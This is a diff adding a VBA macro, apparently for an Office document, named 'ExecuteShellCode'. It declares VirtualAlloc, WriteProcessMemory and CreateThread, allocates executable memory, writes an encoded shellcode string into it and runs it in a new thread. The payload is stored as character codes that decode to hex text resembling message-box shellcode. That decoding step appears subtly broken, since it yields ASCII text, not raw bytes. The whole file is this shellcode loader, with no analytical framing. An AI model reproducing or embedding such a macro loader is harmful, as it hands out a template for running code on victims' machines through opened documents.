@@ -1,0 +1,67 @@
+Private Declare Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As Long
+Private Declare Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As Long, ByVal lpAddress As Long, ByVal lpBuffer As String, ByVal dwSize As Long, ByRef lpNumberOfBytesWritten As Long) As Integer
+Private Declare Function CreateThread Lib "KERNEL32" (ByVal lpThreadAttributes As Long, ByVal dwStackSize As Long, ByVal lpStartAddress As Long, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByRef lpThreadId As Long) As Long
+
+Const MEM_COMMIT = &H1000
+Const PAGE_EXECUTE_READWRITE = &H40
+
+Private Sub ExecuteShellCode()
+	Dim lpMemory As Long
+	Dim sShellCode As String
+	Dim lResult As Long
+
+	sShellCode = ShellCode()
+	lpMemory = VirtualAlloc(0&, Len(sShellCode), MEM_COMMIT, PAGE_EXECUTE_READWRITE)
+	lResult = WriteProcessMemory(-1&, lpMemory, sShellCode, Len(sShellCode), 0&)
+	lResult = CreateThread(0&, 0&, lpMemory, 0&, 0&, 0&)
+End Sub
+
+Private Function ParseBytes(strBytes) As String
+	Dim aNumbers
+	Dim sShellCode As String
+	Dim iIter
+
+	sShellCode = ""
+	aNumbers = split(strBytes)
+	for iIter = lbound(aNumbers) to ubound(aNumbers)
+		sShellCode = sShellCode + Chr(aNumbers(iIter))
+	next
+
+	ParseBytes = sShellCode
+End Function
+
+Private Function ShellCode1() As String
+	Dim sShellCode As String
+
+	sShellCode = ""
+	sShellCode = sShellCode + ParseBytes("70 67 32 54 56 32 54 65 32 48 65 32 51 56 32 49 69 32 54 56 32 54 51 32 56 57 32 68")
+	sShellCode = sShellCode + ParseBytes("49 32 52 70 32 54 56 32 51 50 32 55 52 32 57 49 32 48 67 32 56 66 32 70 52 32 56 68")
+	sShellCode = sShellCode + ParseBytes("32 55 69 32 70 52 32 51 51 32 68 66 32 66 55 32 48 52 32 50 66 32 69 51 32 54 54 32")
+	sShellCode = sShellCode + ParseBytes("66 66 32 51 51 32 51 50 32 53 51 32 54 56 32 55 53 32 55 51 32 54 53 32 55 50 32 53")
+	sShellCode = sShellCode + ParseBytes("52 32 51 51 32 68 50 32 54 52 32 56 66 32 53 65 32 51 48 32 56 66 32 53 66 32 48 67")
+	sShellCode = sShellCode + ParseBytes("32 56 66 32 53 66 32 48 67 32 56 66 32 49 66 32 56 66 32 49 66 32 56 66 32 53 66 32")
+	sShellCode = sShellCode + ParseBytes("49 56 32 56 66 32 69 66 32 65 68 32 51 68 32 54 65 32 48 65 32 51 56 32 49 69 32 55")
+	sShellCode = sShellCode + ParseBytes("53 32 48 53 32 57 53 32 70 70 32 53 55 32 70 56 32 57 53 32 54 48 32 56 66 32 52 53")
+	sShellCode = sShellCode + ParseBytes("32 51 67 32 56 66 32 52 67 32 48 53 32 55 56 32 48 51 32 67 68 32 56 66 32 53 57 32")
+	sShellCode = sShellCode + ParseBytes("50 48 32 48 51 32 68 68 32 51 51 32 70 70 32 52 55 32 56 66 32 51 52 32 66 66 32 48")
+	sShellCode = sShellCode + ParseBytes("51 32 70 53 32 57 57 32 48 70 32 66 69 32 48 54 32 51 65 32 67 52 32 55 52 32 48 56")
+	sShellCode = sShellCode + ParseBytes("32 67 49 32 67 65 32 48 55 32 48 51 32 68 48 32 52 54 32 69 66 32 70 49 32 51 66 32")
+	sShellCode = sShellCode + ParseBytes("53 52 32 50 52 32 49 67 32 55 53 32 69 52 32 56 66 32 53 57 32 50 52 32 48 51 32 68")
+	sShellCode = sShellCode + ParseBytes("68 32 54 54 32 56 66 32 51 67 32 55 66 32 56 66 32 53 57 32 49 67 32 48 51 32 68 68")
+	sShellCode = sShellCode + ParseBytes("32 48 51 32 50 67 32 66 66 32 57 53 32 53 70 32 65 66 32 53 55 32 54 49 32 51 68 32")
+	sShellCode = sShellCode + ParseBytes("54 65 32 48 65 32 51 56 32 49 69 32 55 53 32 65 57 32 51 51 32 68 66 32 53 51 32 54")
+	sShellCode = sShellCode + ParseBytes("56 32 54 52 32 54 49 32 51 48 32 50 51 32 54 56 32 50 51 32 53 48 32 54 49 32 54 69")
+	sShellCode = sShellCode + ParseBytes("32 56 66 32 67 52 32 53 51 32 53 48 32 53 48 32 53 51 32 70 70 32 53 55 32 70 67 32")
+	sShellCode = sShellCode + ParseBytes("53 51 32 70 70 32 53 55 32 70 56")
+
+	ShellCode1 = sShellCode
+End Function
+
+Private Function ShellCode() As String
+	Dim sShellCode As String
+
+	sShellCode = ""
+	sShellCode = sShellCode + ShellCode1()
+
+	ShellCode = sShellCode
+End Function
